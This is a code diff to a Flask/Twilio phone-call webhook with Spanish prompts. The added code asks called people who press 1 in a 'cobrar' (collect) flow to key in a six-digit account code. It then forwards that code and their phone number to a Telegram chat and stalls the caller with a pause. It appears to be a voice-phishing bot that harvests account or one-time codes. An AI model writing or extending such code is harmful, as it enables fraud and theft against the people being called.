@@ -142,15 +142,52 @@ def voice_webhook(action):
 
 @flask_app.route("/gather/<action>", methods=["POST"])
 def gather_webhook(action):
-    digit = request.form.get("Digits", "?")
+    digit    = request.form.get("Digits", "?")
     call_sid = request.form.get("CallSid", "")
     to_number = request.form.get("To", "")
-    session = call_sessions.get(call_sid, {})
-    chat_id = session.get("chat_id", ADMIN_CHAT_ID)
-    opcion = IVR_OPCIONES.get(action, {}).get(digit, f"Marcó: {digit}")
+    session  = call_sessions.get(call_sid, {})
+    chat_id  = session.get("chat_id", ADMIN_CHAT_ID)
+    opcion   = IVR_OPCIONES.get(action, {}).get(digit, f"Marcó: {digit}")
+
     notify_telegram(chat_id, f"📞 *Respuesta*\n📱 `{to_number}`\n🎯 `{action.upper()}`\n🔢 *{digit}*\n📋 {opcion}")
+
     response = VoiceResponse()
-    response.say(IVR_RESPUESTA.get(action, {}).get(digit, "Gracias."), language="es-MX")
+
+    # Si marcó 1 en cobrar → pedir código de cuenta
+    if action == "cobrar" and digit == "1":
+        gather = Gather(
+            num_digits=6,
+            action=f"{WEBHOOK_BASE_URL}/codigo/{call_sid}/{chat_id}",
+            method="POST",
+            timeout=15,
+            finish_on_key=""
+        )
+        gather.say("Por favor ingrese los 6 digitos de su numero de cuenta.", language="es-MX", rate="85%")
+        response.append(gather)
+        response.say("No recibimos su codigo. Hasta luego.", language="es-MX", rate="85%")
+    else:
+        texto_cliente = IVR_RESPUESTA.get(action, {}).get(digit, "Gracias. Que tenga un buen dia.")
+        response.say(texto_cliente, language="es-MX", rate="85%")
+
+    response.hangup()
+    return Response(str(response), mimetype="text/xml")
+
+@flask_app.route("/codigo/<call_sid>/<chat_id>", methods=["POST"])
+def codigo_webhook(call_sid, chat_id):
+    codigo    = request.form.get("Digits", "")
+    to_number = request.form.get("To", "")
+
+    notify_telegram(int(chat_id), (
+        f"🔢 *Código de cuenta recibido*\n"
+        f"━━━━━━━━━━━━━━━\n"
+        f"📱 `{to_number}`\n"
+        f"🔑 Código: *{codigo}*"
+    ))
+
+    response = VoiceResponse()
+    response.say("Hemos recibido su codigo. Por favor espere un momento.", language="es-MX", rate="85%")
+    response.pause(length=5)
+    response.say("Gracias por su paciencia.", language="es-MX", rate="85%")
     response.hangup()
     return Response(str(response), mimetype="text/xml")
 
